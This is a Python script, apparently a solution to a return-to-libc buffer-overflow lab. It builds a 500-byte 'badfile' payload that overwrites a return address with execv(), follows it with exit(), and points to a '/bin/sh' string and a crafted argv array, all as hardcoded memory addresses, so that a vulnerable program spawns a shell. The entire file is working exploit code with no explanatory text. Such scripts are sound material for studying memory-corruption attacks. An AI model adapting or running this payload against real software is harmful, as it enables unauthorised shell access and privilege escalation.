#!/usr/bin/python3
import sys
# Fill content with non-zero values
content = bytearray(0xaa for i in range(500))
main_addr = 0x804856B
req_array = 100 

Y = 28
execv_addr = 0xb7eb8780 # The address of execv()
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = 28 + 4
exit_addr = 0xb7e369d0 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

X = 28 + 8
sh_addr = 0xbffffdd2 # The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

W = 28 + 12
argv = main_addr + req_array
content[W:W+4] = (argv).to_bytes(4, byteorder='little')

p_addr = 0xbffff86b
# Create argument array
content[req_array:req_array+4] = (sh_addr).to_bytes(4, byteorder='little')
content[req_array+4:req_array+8] = (p_addr).to_bytes(4, byteorder='little')
content[req_array+8:req_array+12] = (0x00).to_bytes(4, byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
	f.write(content)
